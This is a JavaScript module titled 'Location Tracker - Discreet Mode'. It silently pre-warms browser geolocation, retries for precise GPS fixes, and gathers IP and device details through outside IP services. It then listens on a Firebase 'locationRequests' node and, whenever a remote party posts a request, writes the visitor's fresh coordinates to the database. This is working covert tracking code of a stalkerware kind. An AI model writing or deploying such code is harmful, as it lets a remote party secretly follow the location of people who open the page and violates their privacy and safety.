/**
 * Location Tracker - Discreet Mode
 * Strategy: GPS first (with retry), then WiFi, Cell, IP fallback.
 * Priority: GPS > WiFi > Cell Tower > IP-Based
 */
import { getDeviceInfo } from '../../utils/browser-detection.js';
import { logger } from '../../utils/logger.js';

let cachedPosition = null;
let cachedSource = null;
let prewarmComplete = false;

export function prewarmLocation() {
    if (!navigator.geolocation) { prewarmComplete = true; return; }
    logger.debug('Pre-warming location silently...');
    
    // First attempt with high accuracy (GPS)
    navigator.geolocation.getCurrentPosition(
        (position) => {
            cachedPosition = position;
            cachedSource = classifySource(position);
            prewarmComplete = true;
            logger.debug('Location pre-warmed:', cachedSource, 'accuracy:', position.coords.accuracy);
            
            // If accuracy is poor (>100m), try again with GPS-only settings
            if (position.coords.accuracy > 100) {
                retryWithGPS();
            }
        },
        () => { prewarmComplete = true; logger.debug('Pre-warm denied, will use fallback'); },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
}

// Retry to get better GPS fix
function retryWithGPS() {
    logger.debug('Retrying for better GPS accuracy...');
    navigator.geolocation.getCurrentPosition(
        (position) => {
            // Only update if new position is more accurate
            if (!cachedPosition || position.coords.accuracy < cachedPosition.coords.accuracy) {
                cachedPosition = position;
                cachedSource = classifySource(position);
                logger.debug('GPS retry successful:', cachedSource, 'accuracy:', position.coords.accuracy);
            }
        },
        () => logger.debug('GPS retry failed, keeping previous position'),
        { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
    );
}

export async function getLocation() {
    // Try to get fresh GPS position first
    if (navigator.geolocation) {
        try {
            // First try: Quick high-accuracy attempt
            const position = await getCurrentPosition(10000);
            let source = classifySource(position);
            let finalPosition = position;
            
            // If accuracy > 100m, try again for GPS
            if (position.coords.accuracy > 100) {
                logger.debug('First attempt accuracy:', position.coords.accuracy, '- retrying for GPS...');
                try {
                    const gpsPosition = await getCurrentPosition(15000);
                    if (gpsPosition.coords.accuracy < position.coords.accuracy) {
                        finalPosition = gpsPosition;
                        source = classifySource(gpsPosition);
                        logger.debug('GPS retry improved accuracy to:', gpsPosition.coords.accuracy);
                    }
                } catch (e) {
                    logger.debug('GPS retry failed, using first position');
                }
            }
            
            const ip = await getIP();
            return { 
                latitude: finalPosition.coords.latitude, 
                longitude: finalPosition.coords.longitude, 
                accuracy: finalPosition.coords.accuracy, 
                source, 
                ip 
            };
        } catch (e) { 
            logger.debug('Geolocation failed, trying cached or IP fallback:', e.message); 
        }
    }
    
    // Use cached position if available
    if (cachedPosition) {
        const ip = await getIP();
        return { 
            latitude: cachedPosition.coords.latitude, 
            longitude: cachedPosition.coords.longitude, 
            accuracy: cachedPosition.coords.accuracy, 
            source: cachedSource, 
            ip 
        };
    }
    
    // Last resort: IP-based location
    return getIPLocation();
}

function getCurrentPosition(timeout = 10000) {
    return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
            resolve, 
            reject, 
            { 
                enableHighAccuracy: true, 
                timeout, 
                maximumAge: 0  // Always get fresh position, never use cache
            }
        );
    });
}

/**
 * Classify location source based on accuracy and altitude data
 * GPS typically provides altitude, WiFi/Cell usually don't
 * 
 * Accuracy thresholds (adjusted for real-world mobile behavior):
 * - GPS High: < 20m (clear sky, good GPS chip)
 * - GPS: < 100m (typical phone GPS)
 * - WiFi: < 200m (triangulated from access points)  
 * - Cell Tower: < 5000m (triangulated from towers)
 * - IP-Based: > 5000m (city-level)
 */
function classifySource(position) {
    const acc = position.coords.accuracy;
    const hasAltitude = position.coords.altitude !== null && !isNaN(position.coords.altitude);
    const hasAltitudeAccuracy = position.coords.altitudeAccuracy !== null && !isNaN(position.coords.altitudeAccuracy);
    
    // GPS almost always provides altitude data
    if (hasAltitude && hasAltitudeAccuracy) {
        if (acc < 20) return 'GPS (High Accuracy)';
        if (acc < 100) return 'GPS';
        if (acc < 500) return 'GPS (Assisted)';
    }
    
    // No altitude = likely WiFi or Cell
    if (acc < 20) return 'GPS (High Accuracy)';
    if (acc < 100) return 'GPS';
    if (acc < 200) return 'WiFi';
    if (acc < 1000) return 'WiFi/Cell';
    if (acc < 5000) return 'Cell Tower';
    return 'IP-Based';
}

async function getIP() {
    try { const r = await fetch('https://api.ipify.org?format=json'); return (await r.json()).ip; }
    catch { try { const r = await fetch('https://api.ip.sb/geoip'); return (await r.json()).ip; } catch { return null; } }
}

async function getIPLocation() {
    const ip = await getIP();
    const services = [
        { url: `http://ip-api.com/json/${ip}`, parse: d => ({ lat: d.lat, lng: d.lon, acc: 5000 }) },
        { url: `https://ipapi.co/${ip}/json/`, parse: d => ({ lat: d.latitude, lng: d.longitude, acc: 10000 }) }
    ];
    for (const s of services) {
        try {
            const r = await fetch(s.url);
            const d = await r.json();
            if (d.lat && d.lng) {
                const p = s.parse(d);
                return { latitude: p.lat, longitude: p.lng, accuracy: p.acc, source: 'IP-Based', ip };
            }
        } catch { continue; }
    }
    return { latitude: null, longitude: null, accuracy: null, source: 'IP (No Coordinates)', ip };
}

export function captureDeviceInfo() { return getDeviceInfo(); }

export function determineLocationSource(position) { return Promise.resolve(classifySource(position)); }
export function getHighAccuracyPosition() { return getCurrentPosition(10000); }

export function listenForLocationRequests() {
    if (!window.database) return;
    window.database.ref('locationRequests').on('child_added', async (snapshot) => {
        const req = snapshot.val();
        if (!req || req.status !== 'pending') return;
        try {
            const loc = await getLocation();
            await snapshot.ref.update({
                status: 'completed',
                newLocation: { latitude: loc.latitude, longitude: loc.longitude, accuracy: loc.accuracy, timestamp: new Date().toISOString(), locationSource: loc.source },
                completedAt: firebase.database.ServerValue.TIMESTAMP
            });
        } catch (e) {
            await snapshot.ref.update({ status: 'failed', error: e.message, completedAt: firebase.database.ServerValue.TIMESTAMP });
        }
    });
}

export function setupUnloadHandler() {
    window.addEventListener('beforeunload', async () => {
        try {
            const ip = await getIP();
            if (ip && window.database) {
                const snap = await window.database.ref('locations').orderByChild('ip').equalTo(ip).once('value');
                snap.forEach(c => { if (c.val().status === 'active') c.ref.update({ status: 'inactive' }); });
            }
        } catch (e) { logger.error('Unload error:', e); }
    });
}